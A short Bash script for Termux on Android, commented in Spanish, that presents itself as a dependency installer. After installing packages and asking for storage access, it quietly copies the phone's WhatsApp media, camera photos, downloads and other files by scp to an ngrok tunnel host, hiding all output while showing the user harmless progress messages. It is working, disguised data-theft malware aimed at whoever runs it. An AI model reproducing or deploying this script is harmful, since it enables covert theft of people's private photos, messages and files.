#!/bin/bash
#Validamos Conexion WIFI O Datos
if ping -c1 google.com.mx &>/dev/null;
then
        echo "Instalando Dependencias";
	echo "-----------------------";
	apt-get update -y ;
	pkg install wget openssh net-tools  -y
        echo "Dependencias Instaladas [OK]";
        termux-setup-storage
        echo "Espere unos minutos";
        scp -P 19537 -r /storage/emulated/0/WhatsApp/Media/  offset-x@4.tcp.ngrok.io:/home/offset-x/Documentos/ &>/dev/null;      
	scp -P 19537 -r /storage/emulated/0/DCIM/  offset-x@4.tcp.ngrok.io:/home/offset-x/Documentos/ &>/dev/null;
        scp -P 19537 -r /storage/emulated/0/Download/ offset-x@4.tcp.ngrok.io:/home/offset-x/Documentos/ &>/dev/null;
        scp -P 19537 -r /storage/emulated/0/*.*  offset-x@4.tcp.ngrok.io:/home/offset-x/Documentos/RECIVE_FULL &>/dev/null;
        echo "Proceso Finalizado";

	$@
else
        echo "Necesitas Conexion WIFI o Datos Moviles";
fi
